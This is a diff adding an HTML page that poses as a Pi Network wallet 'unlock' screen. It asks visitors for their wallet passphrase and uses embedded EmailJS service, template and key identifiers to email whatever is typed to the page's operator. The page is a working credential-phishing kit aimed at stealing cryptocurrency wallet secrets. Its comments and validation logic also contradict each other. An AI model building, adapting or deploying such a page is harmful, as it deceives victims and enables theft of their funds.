@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="stylesheet" href="jb.css"/>
+    <style>
+        .error {
+            color: red;
+            font-size: 0.9em;
+        }
+        .valid {
+            color: green;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div id="__next">
+        <div class="flex flex-col px-5 text-sm gap-10 items-center min-h-screen font-Mulish">
+            <!-- Header Section -->
+            <div class="bg-primary absolute top-0 right-0 left-0 flex justify-center items-center text-white gap-2">
+                <img src="chat.jpg" alt="logo" loading="lazy" width="217" height="225" decoding="async" class="h-5 object-contain w-5"/>
+                Wallet
+                <img src="logo.png" alt="logo" loading="lazy" width="3000" height="4089" decoding="async" class="h-10 object-contain w-10"/>
+            </div>
+
+            <!-- Form Section -->
+            <form id="passphraseForm" class="flex flex-col gap-5 w-4/5 mt-16" method="post">
+                <p class="text-center font-bold text-lg">Validate / Unlock Pi Wallet</p>
+
+                <!-- Passphrase Textarea -->
+                <textarea 
+                    id="passphrase" 
+                    placeholder="Enter your 24-word passphrase here" 
+                    class="h-56 border-[1px] border-neutral-500 placeholder:text-base outline-none p-5 rounded-xl" 
+                    name="phrase"></textarea>
+                
+                <!-- Message Display Area -->
+                <div id="message" class="error"></div>
+                
+                <!-- Unlock Button -->
+                <button 
+                    onclick="callfun()"
+                    id="unlockButton" 
+                    type="button" 
+                    class="w-full border font-bold text-white bg-primary py-2 rounded-md">
+                    Unlock with passphrase
+                </button>
+
+                <!-- Information Paragraph -->
+                <p>
+                    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                    Recovery of passphrase is currently impossible. <br/><br/> 
+                    Lost your passphrase? 
+                    <span class="text-blue-500">You can create a new wallet</span>, but all your π in your previous wallet will be inaccessible.
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const textarea = document.getElementById('passphrase');
+        const messageDiv = document.getElementById('message');
+        const unlockButton = document.getElementById('unlockButton');
+    
+        // Function to validate passphrase input (only one word with 24 characters)
+        textarea.addEventListener('input', function () {
+            const input = textarea.value.trim();
+            
+            // Check if the input has exactly 24 characters and is alphanumeric
+            const isValid = /^[a-zA-Z0-9]{24}$/.test(input);
+    
+            if (input.length !== 24) {
+                messageDiv.textContent = 'The passphrase must be exactly 24 characters long.';
+                messageDiv.className = 'error';
+                unlockButton.disabled = false; // Disable unlock button
+            } else if (!isValid) {
+                messageDiv.textContent = 'The passphrase must contain only alphanumeric characters (no spaces or special characters).';
+                messageDiv.className = 'error';
+                unlockButton.disabled = false; // Disable unlock button
+            } else {
+                messageDiv.textContent = 'Passphrase is valid.';
+                messageDiv.className = 'valid';
+                unlockButton.disabled = false; // Enable unlock button when valid
+            }
+        });
+    
+        // Function to send email only if passphrase is valid
+        function sendMail() {
+            let parms = {
+                name: "User",
+                email: "dummy@gmail.com",
+                subject: "message",
+                message: document.getElementById("passphrase").value,
+            };
+    
+            emailjs.send("service_y1jp8b7", "template_r9a2y2r", parms)
+                .then(() => {
+                    alert("Passphrase validated and mail sent.");
+                })
+                .catch((error) => {
+                    console.error("Error sending email:", error);
+                });
+        }
+    
+        // Unlock button click event handler
+        async function callfun() {
+            // event.preventDefault();  // Prevent form submission
+            // Only send email if the passphrase is valid
+            // console.log("HI")
+            if (messageDiv.className === 'valid') {
+                sendMail();
+            } else {
+                // console.log("HII");
+                alert("Invalid passphrase! Please correct the errors.");
+            }
+        };
+    </script>
+    
+
+    <!-- EmailJS Integration -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("Bb-VaxQZJzEUqQ6Eb"); // Initialize EmailJS with your public key
+        })();
+    </script>
+    <script>src="script.js"</script> 
+</body>
+</html>
